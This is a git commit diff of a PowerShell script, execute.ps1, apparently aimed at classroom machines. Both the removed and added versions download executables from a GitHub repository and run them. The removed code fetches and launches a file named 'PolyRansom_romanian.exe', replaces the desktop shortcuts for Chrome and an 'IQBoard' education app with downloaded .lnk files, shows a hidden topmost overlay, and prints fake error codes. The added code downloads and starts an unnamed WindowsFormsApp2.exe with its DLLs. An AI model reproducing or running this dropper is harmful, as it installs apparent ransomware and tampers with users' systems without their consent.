ee2f5916eaef1626c338c5add5544096d7f77aa7
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-09 11:40:35 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,72 +1,19 @@
-$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
-$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($url, $downloadPath)
-$chromeUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Google%20Chrome.download"
-$iqboardUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Software%20Educational%20IQBoard.download"
+$urls = @(
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
+)
 
-$chromeFileName = "Google Chrome.lnk"
-$iqboardFileName = "Software Educational IQBoard.lnk"
-
-$chromePath = "$env:USERPROFILE\Desktop\$chromeFileName"
-$iqboardPath = "$env:USERPROFILE\Desktop\$iqboardFileName"
-
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$form = New-Object System.Windows.Forms.Form
-$form.StartPosition = 'Manual' 
-$form.FormBorderStyle = 'None'
-$form.BackColor = [System.Drawing.Color]::Lime
-$form.TransparencyKey = $form.BackColor
-$form.TopMost = $true
-$form.Width = 50
-$form.Height = 50 
-$label = New-Object System.Windows.Forms.Label
-$label.Text = "H"
-$label.ForeColor = [System.Drawing.Color]::Green
-$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
-$label.AutoSize = $true
-$label.BackColor = [System.Drawing.Color]::Transparent
-$form.Controls.Add($label)
-$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
-$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
-$formLocationX = [int]$screenWidth - [int]$form.Width
-$formLocationY = [int]$screenHeight - [int]$form.Height
-$form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)
-$form.Add_MouseDown({
-    $form.Capture = $false
-})
-$form.Show()
-Start-Sleep -Seconds 1
-
-if (Test-Path $chromePath) {
-    Remove-Item $chromePath -Force
+$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
+if (-not (Test-Path -Path $downloadDir)) {
+    New-Item -ItemType Directory -Path $downloadDir
 }
 
-if (Test-Path $iqboardPath) {
-    Remove-Item $iqboardPath -Force
+foreach ($url in $urls) {
+    $fileName = [System.IO.Path]::GetFileName($url)
+    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
+    Invoke-WebRequest -Uri $url -OutFile $destinationPath
 }
 
-Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath
-
-Invoke-WebRequest -Uri $iqboardUrl -OutFile $iqboardPath
-
-Start-Sleep -Seconds 1
-
-if (Test-Path $downloadPath) {
-    Start-Process -FilePath $downloadPath -Wait
-    Start-Sleep -Seconds 10
-    
-    $process = Get-Process | Where-Object {$_.MainModule.FileName -eq $downloadPath}
-    
-    if ($process) {
-        $processName = $process.Name
-        Write-Host "$processName"
-        Stop-Process -Name $processName -Force
-        Write-Host "Error 300"
-    } else {
-        Write-Host "Error 500"
-    }
-} else {
-    Write-Host "Error 404"
-}
+$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
+Start-Process -FilePath $exePath
